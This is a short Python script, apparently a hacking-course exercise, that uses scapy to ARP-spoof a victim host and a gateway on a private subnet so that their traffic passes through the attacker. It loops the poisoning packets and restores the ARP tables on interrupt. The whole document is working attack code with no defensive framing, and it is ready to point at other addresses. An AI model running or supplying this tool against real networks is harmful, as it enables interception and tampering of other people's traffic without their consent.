#!/usr/bin/env python
import sys
import time

import scapy.all as scapy

# before run enable ip forward


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout = 1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(target_ip, source_ip):
    target_mac = get_mac(target_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

sent_packet_count = 0
try:
    while True:
        sent_packet_count = sent_packet_count + 2
        spoof("192.168.175.138","192.168.175.2")
        spoof("192.168.175.2","192.168.175.138")
        print("\r[+] packets sent:" + str(sent_packet_count), end="")
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    restore("192.168.175.138", "192.168.175.2")
    restore("192.168.175.2", "192.168.175.138")
    print("\n[-] restore and quiting")

